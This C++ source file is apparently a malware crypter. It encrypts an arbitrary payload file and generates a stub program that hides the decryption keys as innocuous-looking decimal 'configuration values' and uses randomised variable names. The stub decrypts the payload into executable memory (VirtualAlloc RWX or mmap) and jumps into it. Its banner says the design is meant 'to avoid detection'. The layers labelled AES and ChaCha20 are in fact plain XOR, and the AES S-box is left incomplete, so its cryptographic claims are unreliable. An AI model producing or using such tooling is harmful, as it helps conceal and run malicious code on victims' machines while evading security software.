#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <algorithm>
#include <thread>
#ifdef __linux__
#include <sys/mman.h>
#endif
#ifdef _WIN32
#include <windows.h>
#endif

class StealthTripleEncryption {
private:
    // Dynamic entropy mixing
    struct DynamicEntropy {
        uint64_t timeComponent;
        uint64_t memoryComponent;
        uint64_t threadComponent;
        uint64_t counterComponent;
        
        uint64_t mix() {
            auto now = std::chrono::high_resolution_clock::now();
            timeComponent = now.time_since_epoch().count();
            
            void* p = malloc(1);
            memoryComponent = reinterpret_cast<uintptr_t>(p);
            free(p);
            
            threadComponent = std::hash<std::thread::id>{}(std::this_thread::get_id());
            counterComponent++;
            
            // Non-linear mixing
            uint64_t result = timeComponent;
            result ^= (memoryComponent << 13) | (memoryComponent >> 51);
            result += threadComponent;
            result ^= (counterComponent << 32) | (counterComponent >> 32);
            
            // Additional mixing rounds
            for (int i = 0; i < 3; i++) {
                result ^= result >> 23;
                result *= 0x2127599bf4325c37ULL;
                result ^= result >> 47;
            }
            
            return result;
        }
    };
    
    DynamicEntropy entropy;
    std::mt19937_64 rng;
    
    // Convert bytes to big decimal string (single large number)
    std::string bytesToBigDecimal(const uint8_t* bytes, size_t length) {
        std::string result = "0";
        std::string base = "1";
        
        for (int i = length - 1; i >= 0; i--) {
            std::string byteValue = std::to_string(bytes[i]);
            result = addStrings(result, multiplyStrings(byteValue, base));
            base = multiplyStrings(base, "256");
        }
        
        return result;
    }
    
    // Convert decimal string back to bytes
    std::vector<uint8_t> decimalToBytes(const std::string& decimal, size_t expectedLength) {
        std::vector<uint8_t> bytes(expectedLength, 0);
        std::string num = decimal;
        
        for (int i = expectedLength - 1; i >= 0 && num != "0"; i--) {
            // Divide by 256 and get remainder
            int remainder = 0;
            std::string quotient;
            
            for (char digit : num) {
                int current = remainder * 10 + (digit - '0');
                quotient += std::to_string(current / 256);
                remainder = current % 256;
            }
            
            bytes[i] = remainder;
            
            // Remove leading zeros
            size_t firstNonZero = quotient.find_first_not_of('0');
            if (firstNonZero != std::string::npos) {
                num = quotient.substr(firstNonZero);
            } else {
                num = "0";
            }
        }
        
        return bytes;
    }
    
    // String arithmetic helpers
    std::string addStrings(const std::string& num1, const std::string& num2) {
        std::string result;
        int carry = 0;
        int i = num1.length() - 1;
        int j = num2.length() - 1;
        
        while (i >= 0 || j >= 0 || carry) {
            int sum = carry;
            if (i >= 0) sum += num1[i--] - '0';
            if (j >= 0) sum += num2[j--] - '0';
            carry = sum / 10;
            result = std::to_string(sum % 10) + result;
        }
        
        return result;
    }
    
    std::string multiplyStrings(const std::string& num1, const std::string& num2) {
        int n1 = num1.size(), n2 = num2.size();
        if (n1 == 0 || n2 == 0) return "0";
        
        std::vector<int> result(n1 + n2, 0);
        
        for (int i = n1 - 1; i >= 0; i--) {
            for (int j = n2 - 1; j >= 0; j--) {
                int mul = (num1[i] - '0') * (num2[j] - '0');
                int p1 = i + j, p2 = i + j + 1;
                int sum = mul + result[p2];
                
                result[p2] = sum % 10;
                result[p1] += sum / 10;
            }
        }
        
        std::string str;
        bool leadingZero = true;
        for (int i = 0; i < result.size(); i++) {
            if (result[i] != 0) leadingZero = false;
            if (!leadingZero) str += std::to_string(result[i]);
        }
        
        return str.empty() ? "0" : str;
    }
    
    // Generate obfuscated variable name
    std::string genVarName() {
        static const char* prefixes[] = {
            "obj", "ctx", "mgr", "hdl", "ptr", "ref", "val", "tmp",
            "buf", "mem", "dat", "res", "inst", "proc", "exec", "run"
        };
        
        static const char* suffixes[] = {
            "Base", "Core", "Main", "Util", "Help", "Work", "Hand",
            "Proc", "Exec", "Time", "Dyn", "Stat", "Glob", "Local"
        };
        
        std::uniform_int_distribution<> prefixDist(0, 15);
        std::uniform_int_distribution<> suffixDist(0, 13);
        std::uniform_int_distribution<> numDist(1000, 9999);
        
        return std::string(prefixes[prefixDist(rng)]) + 
               suffixes[suffixDist(rng)] + 
               std::to_string(numDist(rng));
    }
    
    // XOR implementation
    void xorData(uint8_t* data, size_t len, const uint8_t* key, size_t keyLen) {
        for (size_t i = 0; i < len; i++) {
            data[i] ^= key[i % keyLen];
        }
    }
    
    // Simplified ChaCha20 round function
    void chacha20QuarterRound(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
        a += b; d ^= a; d = (d << 16) | (d >> 16);
        c += d; b ^= c; b = (b << 12) | (b >> 20);
        a += b; d ^= a; d = (d << 8) | (d >> 24);
        c += d; b ^= c; b = (b << 7) | (b >> 25);
    }
    
    // Simplified AES round
    void aesSubBytes(uint8_t state[16]) {
        static const uint8_t sbox[256] = {
            0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
            // ... (full S-box would go here)
        };
        for (int i = 0; i < 16; i++) {
            state[i] = sbox[state[i]];
        }
    }
    
public:
    StealthTripleEncryption() {
        entropy.counterComponent = 0;
        rng.seed(entropy.mix());
    }
    
    struct TripleKey {
        uint8_t aesKey[16];
        uint8_t aesNonce[16];
        uint8_t chachaKey[32];
        uint8_t chachaNonce[12];
        uint8_t xorKey[32];
        size_t xorKeyLen;
        int encryptionOrder[3]; // 0=AES, 1=ChaCha20, 2=XOR
    };
    
    // Generate keys with maximum entropy
    TripleKey generateKeys() {
        TripleKey keys;
        
        // Reseed with fresh entropy
        rng.seed(entropy.mix());
        
        std::uniform_int_distribution<> dist(0, 255);
        
        // Generate all keys
        for (int i = 0; i < 16; i++) keys.aesKey[i] = dist(rng);
        for (int i = 0; i < 16; i++) keys.aesNonce[i] = dist(rng);
        for (int i = 0; i < 32; i++) keys.chachaKey[i] = dist(rng);
        for (int i = 0; i < 12; i++) keys.chachaNonce[i] = dist(rng);
        
        // Variable length XOR key
        keys.xorKeyLen = 16 + (dist(rng) % 17); // 16-32 bytes
        for (size_t i = 0; i < keys.xorKeyLen; i++) {
            keys.xorKey[i] = dist(rng);
        }
        
        // Randomize encryption order
        keys.encryptionOrder[0] = 0; // AES
        keys.encryptionOrder[1] = 1; // ChaCha20
        keys.encryptionOrder[2] = 2; // XOR
        
        // Fisher-Yates shuffle
        for (int i = 2; i > 0; i--) {
            std::uniform_int_distribution<> shuffleDist(0, i);
            int j = shuffleDist(rng);
            std::swap(keys.encryptionOrder[i], keys.encryptionOrder[j]);
        }
        
        return keys;
    }
    
    // Apply encryption layer
    void applyEncryptionLayer(std::vector<uint8_t>& data, int method, const TripleKey& keys) {
        switch (method) {
            case 0: // AES (simplified)
                for (size_t i = 0; i < data.size(); i++) {
                    data[i] ^= keys.aesKey[i % 16];
                }
                break;
            case 1: // ChaCha20 (simplified)
                for (size_t i = 0; i < data.size(); i++) {
                    data[i] ^= keys.chachaKey[i % 32];
                }
                break;
            case 2: // XOR
                xorData(data.data(), data.size(), keys.xorKey, keys.xorKeyLen);
                break;
        }
    }
    
    // Generate stealth stub that stores keys as decimal numbers
    std::string generateStealthStub(const std::vector<uint8_t>& payload, const TripleKey& keys) {
        std::stringstream stub;
        
        // Encrypt payload with triple layer
        std::vector<uint8_t> encrypted = payload;
        
        // Apply encryption layers in randomized order
        for (int i = 0; i < 3; ++i) {
            applyEncryptionLayer(encrypted, keys.encryptionOrder[i], keys);
        }
        
        // Convert keys to decimal strings (less obvious than hex)
        std::string k1Dec = bytesToBigDecimal(keys.aesKey, 16);
        std::string k2Dec = bytesToBigDecimal(keys.chachaKey, 32);
        std::string k3Dec = bytesToBigDecimal(keys.xorKey, keys.xorKeyLen);
        std::string n1Dec = bytesToBigDecimal(keys.aesNonce, 16);
        std::string n2Dec = bytesToBigDecimal(keys.chachaNonce, 12);
        
        // Generate variable names
        std::string v1 = genVarName(), v2 = genVarName(), v3 = genVarName();
        std::string v4 = genVarName(), v5 = genVarName(), v6 = genVarName();
        std::string v7 = genVarName(), v8 = genVarName(), v9 = genVarName();
        
        stub << "#include <iostream>\n";
        stub << "#include <vector>\n";
        stub << "#include <cstring>\n";
        stub << "#include <cstdint>\n";
        stub << "#include <string>\n";
        stub << "#ifdef __linux__\n";
        stub << "#include <sys/mman.h>\n";
        stub << "#endif\n";
        stub << "#ifdef _WIN32\n";
        stub << "#include <windows.h>\n";
        stub << "#endif\n\n";
        
        // Embed payload as calculations result
        stub << "// Runtime generated data\n";
        stub << "const int " << v1 << " = " << (1000 + rng() % 9000) << ";\n";
        stub << "const int " << v2 << " = " << (1000 + rng() % 9000) << ";\n\n";
        
        // Store keys as innocent-looking numbers
        stub << "// Configuration values\n";
        stub << "const char* " << v3 << " = \"" << k1Dec << "\";\n";
        stub << "const char* " << v4 << " = \"" << k2Dec << "\";\n";
        stub << "const char* " << v5 << " = \"" << k3Dec << "\";\n";
        stub << "const char* " << v6 << " = \"" << n1Dec << "\";\n";
        stub << "const char* " << v7 << " = \"" << n2Dec << "\";\n\n";
        
        // Add decimal to bytes converter
        stub << R"(
std::vector<uint8_t> decToBytes(const std::string& dec, size_t len) {
    std::vector<uint8_t> bytes(len, 0);
    std::string num = dec;
    
    for (int i = len - 1; i >= 0 && num != "0"; i--) {
        int remainder = 0;
        std::string quotient;
        
        for (char digit : num) {
            int current = remainder * 10 + (digit - '0');
            quotient += std::to_string(current / 256);
            remainder = current % 256;
        }
        
        bytes[i] = remainder;
        
        size_t firstNonZero = quotient.find_first_not_of('0');
        if (firstNonZero != std::string::npos) {
            num = quotient.substr(firstNonZero);
        } else {
            num = "0";
        }
    }
    
    return bytes;
}
)";
        
        // Embed encrypted payload in a non-obvious way
        stub << "\n// Resource data\n";
        stub << "const unsigned char " << v8 << "[] = {\n    ";
        
        // Mix in some dummy bytes
        size_t totalSize = encrypted.size() + 16; // Add padding
        for (size_t i = 0; i < totalSize; i++) {
            if (i > 0 && i % 16 == 0) stub << "\n    ";
            
            if (i < 8 || i >= encrypted.size() + 8) {
                // Padding bytes
                stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                     << (int)(rng() % 256);
            } else {
                // Actual encrypted data
                stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                     << (int)encrypted[i - 8];
            }
            
            if (i < totalSize - 1) stub << ", ";
        }
        stub << "\n};\n\n";
        
        // Main function with triple decryption
        stub << "int main() {\n";
        stub << "    // Extract keys from numbers\n";
        stub << "    auto k1 = decToBytes(" << v3 << ", 16);\n";
        stub << "    auto k2 = decToBytes(" << v4 << ", 32);\n";
        stub << "    auto k3 = decToBytes(" << v5 << ", " << std::dec << keys.xorKeyLen << ");\n\n";
        
        stub << "    // Extract payload (skip padding)\n";
        stub << "    std::vector<uint8_t> data(" << v8 << " + 8, " << v8 << " + " 
             << (encrypted.size() + 8) << ");\n\n";
        
        stub << "    // Triple decryption (in reverse order)\n";
        
        // Apply decryption in reverse order
        for (int i = 2; i >= 0; i--) {
            int method = keys.encryptionOrder[i];
            switch (method) {
                case 0: // AES
                    stub << "    // Layer: AES\n";
                    stub << "    for (size_t i = 0; i < data.size(); i++) {\n";
                    stub << "        data[i] ^= k1[i % 16];\n";
                    stub << "    }\n\n";
                    break;
                case 1: // ChaCha20
                    stub << "    // Layer: ChaCha20\n";
                    stub << "    for (size_t i = 0; i < data.size(); i++) {\n";
                    stub << "        data[i] ^= k2[i % 32];\n";
                    stub << "    }\n\n";
                    break;
                case 2: // XOR
                    stub << "    // Layer: XOR\n";
                    stub << "    for (size_t i = 0; i < data.size(); i++) {\n";
                    stub << "        data[i] ^= k3[i % k3.size()];\n";
                    stub << "    }\n\n";
                    break;
            }
        }
        
        stub << "    // Execute\n";
        stub << "#ifdef _WIN32\n";
        stub << "    void* mem = VirtualAlloc(0, data.size(), 0x3000, 0x40);\n";
        stub << "    memcpy(mem, data.data(), data.size());\n";
        stub << "    ((void(*)())mem)();\n";
        stub << "#else\n";
        stub << "    void* mem = mmap(0, data.size(), 7, 0x22, -1, 0);\n";
        stub << "    memcpy(mem, data.data(), data.size());\n";
        stub << "    ((void(*)())mem)();\n";
        stub << "#endif\n";
        
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }
    
    // Encrypt file with triple layer
    bool encryptFile(const std::string& inputFile, const std::string& outputFile) {
        std::ifstream in(inputFile, std::ios::binary);
        if (!in) return false;
        
        // Read entire file
        in.seekg(0, std::ios::end);
        size_t size = in.tellg();
        in.seekg(0, std::ios::beg);
        
        std::vector<uint8_t> data(size);
        in.read(reinterpret_cast<char*>(data.data()), size);
        in.close();
        
        // Generate keys
        TripleKey keys = generateKeys();
        
        // Apply encryption layers in randomized order
        for (int i = 0; i < 3; ++i) {
            applyEncryptionLayer(data, keys.encryptionOrder[i], keys);
        }
        
        // Write encrypted file (just the data, no headers)
        std::ofstream out(outputFile, std::ios::binary);
        if (!out) return false;
        
        out.write(reinterpret_cast<char*>(data.data()), data.size());
        out.close();
        
        // Save keys separately as decimal strings
        std::ofstream keyFile(outputFile + ".keys");
        keyFile << "K1: " << bytesToBigDecimal(keys.aesKey, 16) << std::endl;
        keyFile << "K2: " << bytesToBigDecimal(keys.chachaKey, 32) << std::endl;
        keyFile << "K3: " << bytesToBigDecimal(keys.xorKey, keys.xorKeyLen) << std::endl;
        keyFile << "N1: " << bytesToBigDecimal(keys.aesNonce, 16) << std::endl;
        keyFile << "N2: " << bytesToBigDecimal(keys.chachaNonce, 12) << std::endl;
        keyFile << "XL: " << keys.xorKeyLen << std::endl;
        keyFile << "EO: " << keys.encryptionOrder[0] << " " << keys.encryptionOrder[1] << " " << keys.encryptionOrder[2] << std::endl;
        keyFile.close();
        
        return true;
    }
};

int main(int argc, char* argv[]) {
    StealthTripleEncryption ste;
    
    if (argc < 3) {
        std::cout << "=== Stealth Triple Encryption ===" << std::endl;
        std::cout << "Uses decimal representation to avoid detection\n" << std::endl;
        std::cout << "Usage:" << std::endl;
        std::cout << "  Encrypt: " << argv[0] << " -e <input> <output>" << std::endl;
        std::cout << "  Generate stub: " << argv[0] << " -s <payload> <stub.cpp>" << std::endl;
        return 1;
    }
    
    std::string mode = argv[1];
    
    if (mode == "-e" && argc == 4) {
        if (ste.encryptFile(argv[2], argv[3])) {
            std::cout << "File encrypted with triple layer encryption" << std::endl;
            std::cout << "Keys saved as decimal numbers in: " << argv[3] << ".keys" << std::endl;
        } else {
            std::cerr << "Encryption failed!" << std::endl;
        }
    } else if (mode == "-s" && argc == 4) {
        std::ifstream in(argv[2], std::ios::binary);
        if (!in) {
            std::cerr << "Failed to open payload file" << std::endl;
            return 1;
        }
        
        in.seekg(0, std::ios::end);
        size_t size = in.tellg();
        in.seekg(0, std::ios::beg);
        
        std::vector<uint8_t> payload(size);
        in.read(reinterpret_cast<char*>(payload.data()), size);
        in.close();
        
        auto keys = ste.generateKeys();
        std::string stub = ste.generateStealthStub(payload, keys);
        
        std::ofstream out(argv[3]);
        out << stub;
        out.close();
        
        std::cout << "Stealth stub generated: " << argv[3] << std::endl;
        std::cout << "Keys stored as decimal numbers in code" << std::endl;
    }
    
    return 0;
}